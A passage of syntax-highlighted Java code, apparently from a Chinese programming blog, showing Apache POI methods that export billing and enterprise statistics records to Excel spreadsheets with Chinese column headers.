punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"返回结果"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"接口单价（元）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span>            HSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFCellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 生成一个字体</span>            HSSFFont font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            <span class="token comment" spellcheck="true">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作sheet,对应到一个excel文档的tab</span>            HSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"sheet1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的sheet的一行 (表头)</span>            HSSFRow row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 表头内容填充</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置excel每列宽度</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                HSSFCell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 创建内容行</span>            HSSFCellStyle cellStyle <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cellStyle<span class="token punctuation">.</span><span class="token function">setWrapText</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自动换行</span><span class="token comment" spellcheck="true">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat("0.00"));</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFRow contentRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                BillingStatisticsDetailMap billingStatisticsDetailMap <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    HSSFCell cell <span class="token operator">=</span> contentRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>billingStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>billingStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getDataitemUName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>billingStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getMonitorEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>billingStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getSendTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>billingStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getHasContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"有"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"无"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>billingStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getSendStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"正常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>billingStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getActualPrice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">default</span><span class="token operator">:</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">writeExcelIo</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exportTotalStatisticsDetail</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>TotalStatisticsMap<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            List<span class="token operator">&lt;</span>String<span class="token operator">></span> title <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"企业ID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"企业名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"用户名"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"用户ID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"数据项名"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"数据编码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"接口单价（元）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"数量"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"总价（元）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span>            HSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFCellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 生成一个字体</span>            HSSFFont font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            <span class="token comment" spellcheck="true">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作sheet,对应到一个excel文档的tab</span>            HSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"sheet1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的sheet的一行 (表头)</span>            HSSFRow row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 表头内容填充</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置excel每列宽度</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                HSSFCell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 创建内容行</span>            HSSFCellStyle cellStyle <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cellStyle<span class="token punctuation">.</span><span class="token function">setWrapText</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 自动换行</span><span class="token comment" spellcheck="true">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat("0.00"));</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFRow contentRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                TotalStatisticsMap totalStatisticsDetailMap <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    HSSFCell cell <span class="token operator">=</span> contentRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">switch</span> <span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>totalStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getEntUid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>totalStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getMonitorEntName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>totalStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>totalStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getUserId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>totalStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getDataitemUName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>totalStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getDynamicDataCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>totalStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getActualPrice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>totalStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>totalStatisticsDetailMap<span class="token punctuation">.</span><span class="token function">getTotalPrice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token keyword">default</span><span class="token operator">:</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">writeExcelIo</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">excelTStatisticsEnt</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>TStatisticsEnt<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            List<span class="token operator">&lt;</span>String<span class="token operator">></span> title <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"指标大类"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"指标小类"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"开始时间"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"结束时间"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            title<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"数量"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span>            HSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFCellStyle style <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 生成一个字体</span>            HSSFFont font <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            <span class="token comment" spellcheck="true">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span>            font<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            style<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的工作sheet,对应到一个excel文档的tab</span>            HSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"sheet1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 创建Excel的sheet的一行 (表头)</span>            HSSFRow row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 表头内容填充</span>            HSSFCellStyle styleBt <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFFont fontBt <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 字体增粗</span>            fontBt<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            fontBt<span class="token punctuation">.</span><span class="token function">setFontHeightInPoints</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>fontBt<span class="token punctuation">)</span><span class="token punctuation">;</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>SEA_GREEN<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//背景</span>            styleBt<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//            styleBt .setAlignment(HorizontalAlignment.CENTER);</span><span class="token comment" spellcheck="true">//            styleBt .setDataFormat(HSSFDataFormat.getBuiltinFormat("0.00%"));</span><span class="token comment" spellcheck="true">//            styleBt.setFillBackgroundColor((short) 59);</span><span class="token comment" spellcheck="true">//            styleBt.setFillForegroundColor((short) 59);</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> title<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置excel每列宽度</span><span class="token comment" spellcheck="true">//                sheet.setColumnWidth(i, 5000);</span>                sheet<span class="token punctuation">.</span><span class="token function">autoSizeColumn</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">||</span> i <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                HSSFCell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>title<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>styleBt<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 创建内容行</span>            HSSFCellStyle cellStyle <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cellStyle<span class="token punctuation">.</span><span class="token function">setWrapText</span><span class="token 